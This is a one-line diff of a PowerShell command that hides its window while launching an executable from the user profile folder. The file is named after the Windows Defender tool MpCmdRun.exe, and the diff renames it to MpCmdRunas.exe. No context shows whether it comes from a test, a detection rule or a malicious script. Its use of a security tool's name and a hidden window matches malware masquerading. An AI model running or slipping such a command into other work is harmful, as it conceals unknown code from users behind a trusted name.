@@ -1,1 +1,1 @@
-powershell Start-Process "%USERPROFILE%\MpCmdRun.exe" -WindowStyle Hidden
+powershell Start-Process "%USERPROFILE%\MpCmdRunas.exe" -WindowStyle Hidden
